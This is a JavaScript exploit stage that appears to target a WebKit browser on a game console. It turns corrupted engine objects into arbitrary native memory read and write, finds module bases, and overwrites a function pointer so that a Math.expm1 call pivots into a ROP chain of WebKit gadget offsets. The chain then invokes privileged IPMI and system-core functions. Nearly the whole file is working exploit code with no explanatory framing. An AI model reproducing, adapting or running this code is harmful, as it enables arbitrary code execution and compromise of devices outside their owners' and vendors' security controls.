var result;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0]!==state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  var base=state.calibratedViewBase;
  if (carrier.length!==65536 || carrier[0]!==0x31 ||
      carrier[7]!==0xa8 || base%4096!==0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var n=0;n<count;n++) out.push(forged[index+n]);
    return out;
  }
  function valueOf(bytes) {
    var value=0;
    for (var n=bytes.length-1;n>=0;n--)
      value=value*256+bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value<0 ||
        value>=0x1000000000000)
      throw new Error("pointer_invalid");
    var out=[];
    for (var n=0;n<8;n++)
      out.push(Math.floor(value/Math.pow(2,n*8))&255);
    return out;
  }
  function same(left,right) {
    if (!left || !right || left.length!==right.length) return false;
    for (var n=0;n<left.length;n++)
      if (left[n]!==right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0]=object;
      return valueOf(bytesAt(state.index,8));
    } finally {
      state.array[0]=state.a;
    }
  }
  var carrierIndex=addressOf(carrier)-base;
  var carrierSlot=carrierIndex+8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot<0 ||
      carrierSlot+8>=16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal=bytesAt(carrierSlot,8);
  function readAt(address,count) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || count<1 || count>192)
      throw new Error("native_read_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      var out=[];
      for (var r=0;r<count;r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  function writeAt(address,bytes) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || address%8!==0 ||
        !bytes || bytes.length!==8)
      throw new Error("native_write_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      for (var w=0;w<8;w++) carrier[w]=bytes[w];
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  var frame=native.frame;
  var address=native.frameAddress;
  if (frame.length<0x2000 || address<0x200000000 || address>=0x900000000)
    throw new Error("owned_frame_invalid");
  var scratchOffset=0x300;
  var scratchLength=0x1a8;
  function moduleBase(handle) {
    var original=Array.from(frame.subarray(scratchOffset,
      scratchOffset+scratchLength));
    var dv=new DataView(frame.buffer,frame.byteOffset,frame.byteLength);
    var returned;
    try {
      frame.fill(0,scratchOffset,scratchOffset+scratchLength);
      dv.setUint32(scratchOffset,0x1a8,true);
      dv.setUint32(scratchOffset+4,0,true);
      returned=native.call("dynlib_info_ex",[handle,0,address+scratchOffset]);
      if (returned.value!==0)
        throw new Error("module_info_failed_"+handle);
      var lo=dv.getUint32(scratchOffset+0x110,true);
      var hi=dv.getUint32(scratchOffset+0x114,true);
      return hi*0x100000000+lo;
    } finally {
      for (var x=0;x<original.length;x++) frame[scratchOffset+x]=original[x];
    }
  }
  var ipmi=moduleBase(27);
  var syscore=moduleBase(28);
  if (ipmi<0x800000000 || ipmi>=0x900000000 ||
      syscore<0x800000000 || syscore>=0x900000000)
    throw new Error("module_base_invalid");
  var ipmiRo=ipmi+0xc000;
  var rawWrapper=valueOf(readAt(ipmiRo+0x488,8));
  if (!Number.isSafeInteger(rawWrapper) || rawWrapper<0x100000000)
    throw new Error("raw_wrapper_invalid");
  var targets={
    ipmi_config_init:[ipmi+0x11b0,
      [0xc5,0xf8,0x10,0x05,0x88,0x63,0x00,0x00,
       0x48,0xb8,0x00,0x00,0x00,0x00,0x01,0x00]],
    ipmi_client_create:[ipmi+0x1300,
      [0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56,
       0x41,0x55,0x41,0x54,0x53,0x50,0x48,0x85]],
    ipmi_raw_call:[rawWrapper,
      [0x48,0xc7,0xc0,0x6e,0x02,0x00,0x00,0x49,
       0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48]],
    syscore_getter:[syscore+0x1c40,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,0x48,0x48,0x8b,0x1d,
       0xd8,0x63,0x00,0x00]]
  };
  if (!same(readAt(ipmi,8),[0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56]))
    throw new Error("ipmi_image_prefix_changed");
  for (var tname in targets)
    if (!same(readAt(targets[tname][0],16),targets[tname][1]))
      throw new Error("signature_changed_"+tname);
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      !same(readAt(plan.addresses.stack+plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset2=0x2f80;
  var chainSize=19*8;
  if (scratchOffset2<plan.stackOffset+64 ||
      scratchOffset2+chainSize>=plan.stack.length ||
      plan.frame.length<0x2000)
    throw new Error("scratch_region_invalid");
  var caller=function (name,args) {
    if (!Object.prototype.hasOwnProperty.call(targets,name))
      throw new Error("target_not_allowed");
    if (!Array.isArray(args) || args.length>6)
      throw new Error("args_invalid");
    var values=[];
    for (var ai=0;ai<6;ai++) {
      var value=ai<args.length?args[ai]:0;
      if (!Number.isSafeInteger(value) || value<0 ||
          value>=0x1000000000000)
        throw new Error("arg_invalid_"+ai);
      values.push(value);
    }
    var target=targets[name][0];
    if (!same(readAt(target,16),targets[name][1]) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack+plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal=readAt(plan.functionSlot,8);
    var pivotOriginal=readAt(plan.pivotCell,8);
    var pivotStackOriginal=readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal=Array.from(plan.frame.subarray(0,8));
    var chainOriginal=Array.from(plan.stack.subarray(
      scratchOffset2,scratchOffset2+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7]>2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset2+c*8,0x0a,true);
          stackView.setUint32(scratchOffset2+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset2+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset2+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackView.setUint32(scratchOffset2+11*8,0xcafebeaf,true);
      stackView.setUint32(scratchOffset2+11*8+4,0xdeadbade,true);
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset2);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset2,chainSize),
                Array.from(plan.stack.subarray(scratchOffset2,
                                              scratchOffset2+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(plan.webkitBase+0x295f948));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),
                pointerBytes(plan.webkitBase+0x295f948)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true) };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset2+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset2,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  var configOffset=0x600,outOffset=0x500,storageOffset=0x1000;
  var statusOffset=0x780,status2Offset=0x784;
  var resultOffset=0x788,paramsOffset=0x790;
  var getterOutOffset=0x920;
  var configAddress=address+configOffset;
  var outAddress=address+outOffset;
  var storageAddress=address+storageOffset;
  var statusAddress=address+statusOffset;
  var status2Address=address+status2Offset;
  var resultAddress=address+resultOffset;
  var paramsAddress=address+paramsOffset;
  var getterOutAddress=address+getterOutOffset;
  var scratchOriginal=Array.from(frame.subarray(outOffset,storageOffset+0x1000));
  var before=native.call("getpid",[]);
  if (before.value<1 || before.value>100000 || before.high!==0)
    throw new Error("session_pid_changed");
  function put32(offset,value) {
    new DataView(frame.buffer).setUint32(offset,value>>>0,true);
  }
  function put64(offset,value) {
    var dv=new DataView(frame.buffer);
    dv.setUint32(offset,value>>>0,true);
    dv.setUint32(offset+4,Math.floor(value/0x100000000)>>>0,true);
  }
  function get32(offset) {
    return new DataView(frame.buffer).getUint32(offset,true);
  }
  function raw(op,arg2,paramsPtr,paramsSize) {
    put64(resultOffset,0);
    var call=caller("ipmi_raw_call",
      [op,arg2,resultAddress,paramsPtr,paramsSize,0]);
    return {value:call.value,high:call.high,
      errno:call.value===-1?native.readErrno():0,
      result:get32(resultOffset)};
  }
  var create=null,connect=null,getter=null;
  var disconnect=null,destroy=null,kid=0,outValue=0,connectStatus=0;
  try {
    phase="official_fresh_start";
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_official_fresh_preflight");
    plan.frame.fill(0,outOffset,storageOffset+0x1000);
    phase="official_fresh_config";
    caller("ipmi_config_init",[configAddress]);
    phase="official_fresh_name";
    var name="SceSysCoreApp";
    for (var ni=0;ni<name.length;ni++)
      plan.frame[configOffset+ni]=name.charCodeAt(ni);
    plan.frame[configOffset+name.length]=0;
    phase="official_fresh_create";
    create=caller("ipmi_client_create",
      [outAddress,configAddress,0,storageAddress]);
    phase="official_fresh_create_done";
    if (create.value!==0)
      throw new Error("client_create_failed_"+create.value);
    phase="official_fresh_kid";
    kid=get32(storageOffset+8);
    phase="official_fresh_vtable";
    var objectVtable=valueOf(readAt(storageAddress,8));
    if (objectVtable!==ipmi+0xc010)
      throw new Error("fresh_client_vtable_changed");
    phase="official_fresh_connect_params";
    put32(statusOffset,0);
    put32(status2Offset,0);
    put64(paramsOffset+0x00,0);
    put64(paramsOffset+0x08,0);
    put64(paramsOffset+0x10,statusAddress);
    put64(paramsOffset+0x18,status2Address);
    phase="official_fresh_connect";
    connect=raw(0x400,kid,paramsAddress,0x20);
    phase="official_fresh_connected";
    if (connect.value!==0)
      throw new Error("connect_failed_"+connect.value);
    connectStatus=get32(statusOffset);
    if (api && typeof api.markSync==="function")
      api.markSync("syscore_official_fresh_connected");
    var getterOutOriginal=Array.from(frame.subarray(
      getterOutOffset,getterOutOffset+0x10));
    try {
      frame.fill(0xa5,getterOutOffset,getterOutOffset+0x10);
      phase="official_fresh_getter";
      if (api && typeof api.markSync==="function")
        api.markSync("syscore_official_fresh_before");
      getter=caller("syscore_getter",
        [storageAddress,0,getterOutAddress]);
      outValue=new DataView(frame.buffer).getUint32(getterOutOffset,true);
      if (api && typeof api.markSync==="function")
        api.markSync("syscore_official_fresh_after");
    } finally {
      for (var go=0;go<getterOutOriginal.length;go++)
        frame[getterOutOffset+go]=getterOutOriginal[go];
    }
  } finally {
    if (kid!==0) {
      try {
        put64(paramsOffset+0x00,statusAddress);
        put32(statusOffset,0);
        disconnect=raw(0x310,kid,paramsAddress,8);
      } catch (cleanupError) {}
      try {
        destroy=raw(3,kid,0,0);
      } catch (cleanupError) {}
      if (api && typeof api.markSync==="function")
        api.markSync("syscore_official_fresh_cleanup");
    }
    for (var fi=0;fi<scratchOriginal.length;fi++)
      frame[outOffset+fi]=scratchOriginal[fi];
  }
  var after=native.call("getpid",[]);
  var scratchRestored=scratchOriginal.every(function (byte,index) {
    return frame[outOffset+index]===byte;
  });
  var callerRestored=same(bytesAt(carrierSlot,8),carrierOriginal) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (api && typeof api.markSync==="function")
    api.markSync("syscore_official_fresh_restored");
  result={id:"syscore_getter1_fresh_v1",
    status:(create!==null && create.value===0 && connect!==null &&
      connect.value===0 && getter!==null && after.value===before.value &&
      after.high===0 && scratchRestored && callerRestored)?"pass":"fail",
    details:{self_pid:after.value,ipmi_base:ipmi,
      syscore_base:syscore,client_kid:kid,
      client_vtable:ipmi+0xc010,
      create_ret:create?create.value:0,
      connect_ret:connect?connect.value:0,
      connect_status:connectStatus,
      getter_ret:getter?getter.value:0,
      out_value:outValue,
      pid_ok:after.value===before.value&&after.high===0,
      restored:callerRestored&&scratchRestored}};
} catch (error) {
  result={id:"syscore_getter1_fresh_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180),
      stack:String(error&&error.stack||"").slice(0,450)}};
}
return [result];
